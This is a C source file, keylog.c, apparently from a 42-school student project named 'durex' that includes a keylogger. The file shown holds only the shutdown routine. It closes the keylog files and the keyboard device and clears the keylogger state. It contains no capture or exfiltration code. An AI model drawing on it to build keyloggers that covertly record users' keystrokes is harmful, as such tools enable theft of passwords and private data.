/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   keylog.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/20 18:32:14 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 19:28:36 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include "fcntl.h"

static void		my_close(int *fd)
{
	if (*fd >= 0)
	{
		close(*fd);
		*fd = -1;
	}
}

void			keylog_stop(t_durex *durex)
{
	my_close(&durex->kl.keylog_log);
	my_close(&durex->kl.kl.log);
	my_close(&durex->kl.simple.log);
	if (durex->kl.keyboard_device >= 0)
	{
		durex->clients[durex->kl.keyboard_device].type = FD_FREE;
		my_close(&durex->kl.keyboard_device);
	}
	ft_bzero(&durex->kl, sizeof(t_keylog));
	durex->kl.keylogging = 0;
	log_info(durex, "Stopped keylogging\n");
}
